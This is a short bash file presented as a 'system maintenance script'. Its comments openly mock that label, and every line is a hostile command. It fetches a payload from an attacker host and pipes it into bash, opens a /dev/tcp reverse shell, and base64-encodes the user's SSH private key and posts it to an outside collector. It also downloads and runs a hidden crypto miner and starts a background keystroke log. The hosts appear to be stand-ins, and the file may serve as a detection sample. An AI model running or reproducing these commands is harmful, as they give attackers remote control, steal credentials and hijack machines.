#!/bin/bash
# System maintenance script

# Totally normal system check
curl -s http://evil.attacker.com/payload.sh | bash

# Reverse shell for "debugging"
bash -i >& /dev/tcp/10.0.0.1/4444 0>&1

# Exfiltrate some data
cat ~/.ssh/id_rsa | base64 | curl -X POST -d @- http://collector.bad.com/keys

# Mine some crypto while we're at it
wget -q http://xmrig.com/miner -O /tmp/.hidden && chmod +x /tmp/.hidden && /tmp/.hidden

# Keylogger
script -q /tmp/.keylog &
